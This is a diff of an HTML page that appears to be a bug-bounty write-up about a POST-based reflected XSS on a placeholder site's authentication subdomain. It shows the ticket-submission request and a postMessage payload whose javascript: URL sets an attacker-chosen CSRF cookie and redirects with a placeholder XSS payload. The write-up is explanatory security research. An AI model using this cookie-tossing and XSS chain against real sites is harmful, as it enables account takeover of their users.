@@ -321,7 +321,7 @@
        
 
         <h2 id="section-2">2. Post based reflected xss</h2>
-        <p>I was going thorugh <code>account.target.com</code> which was the main subdomain for authentication including oauth response of this target. There, I noticed a feature to send support tickets. The request to send a ticket looked like this<pre><code>POST /submit HTTP/1.1
+        <p>I was going thorugh <code>account.target.com</code> which was the main subdomain for authentication which also handled oauth response of this target. So any xss here could possibly lead to ATO. There, I noticed a feature to send support tickets. The request to send a ticket looked like this<pre><code>POST /submit HTTP/1.1
 Host: account.target.com
 Cookie: _csrf_token_=_csrf_tk_1450275545240563;
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
@@ -377,7 +377,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 F
   const message2 = {
     action: "somestring",
     payload: {
-      url: "javascript:document.cookie = 'csrf_token=i_was_set_by_attacker; domain=.target.com; path=/account_appeal_intl/;', window.location.href = 'https://account.target.com/submit?problemType=big%20problem&firstName=test&lastName=test&contactMobile=23324234&contactEmail=test%40gmail.com&promise=true&requestId=&lt;xss_payload&gt;&type=withoutAccount&_csrf_token_=i_was_set_by_attacker';"
+      url: "javascript:document.cookie = 'csrf_token=i_was_set_by_attacker; domain=.target.com; path=/submit/;', window.location.href = 'https://account.target.com/submit?problemType=big%20problem&firstName=test&lastName=test&contactMobile=23324234&contactEmail=test%40gmail.com&promise=true&requestId=&lt;xss_payload&gt;&type=withoutAccount&_csrf_token_=i_was_set_by_attacker';"
     }
   };
 
